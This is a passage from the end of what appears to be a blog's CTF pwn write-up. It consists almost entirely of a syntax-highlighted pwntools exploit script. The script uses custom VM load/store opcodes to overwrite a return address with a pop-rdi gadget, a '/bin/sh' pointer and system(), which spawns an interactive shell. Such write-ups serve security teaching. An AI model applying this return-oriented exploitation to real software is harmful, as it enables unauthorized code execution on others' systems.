style="color:#4C9A91">7f</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># Registros</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">7FFF</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">7ffff7df91ab</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7ffff7df9083</span><span style="color:#5eaab5">)</span><span style="color:#758575DD"> # Ret offset</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">fae7</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">                          # Pop rdi lo</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">95bd</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">9083</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">                 # Binsh lo</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">f7f8</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">f7df</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">                 # Binsh mid</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">e20d</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">                          # System lo</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">f7e2</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">f7df</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">                 # System mid</span><br><br><span style="color:#758575DD"># Padding</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> *</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">fe</span><span style="color:#CB7676"> -</span><span style="color:#B8A965"> len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># Opcodes</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">             # Cargo 0x7fff en el reg[0]</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">58</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">38</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">48</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">50</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666">  </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">58</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">38</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">48</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">50</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666">  </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">58</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">4</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">38</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">4</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">4</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">48</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">4</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">50</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">4</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666">  </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">58</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">6</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">38</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">6</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">6</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">48</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">6</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">50</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">6</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">58</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">           # RET</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_add</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">38</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666">  </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">58</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">      # Pop Rdi lo</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_add</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">40</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666">  </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">58</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">      # /bin/sh lo</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 4</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_add</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">48</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666">  </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">58</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">      # /bin/sh mid</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 5</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_add</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">48</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666">  </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">58</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">      # System lo</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 6</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_add</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">50</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666">  </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">58</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">      # System mid</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_load_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 7</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_add</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_store_alt</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">50</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">)</span><span style="color:#CB7676">//</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#758575DD"># End</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> opcode_halt</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#758575DD"># Run</span><br><span style="color:#4D9375">assert</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#B8A965">len</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> //</span><span style="color:#4C9A91"> 2</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">8000</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">p16</span><span style="color:#4d9375">(</span><span style="color:#B8A965">len</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> //</span><span style="color:#4C9A91"> 2</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD">######################################################################################</span><br><br><span style="color:#DBD7CAEE">p</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>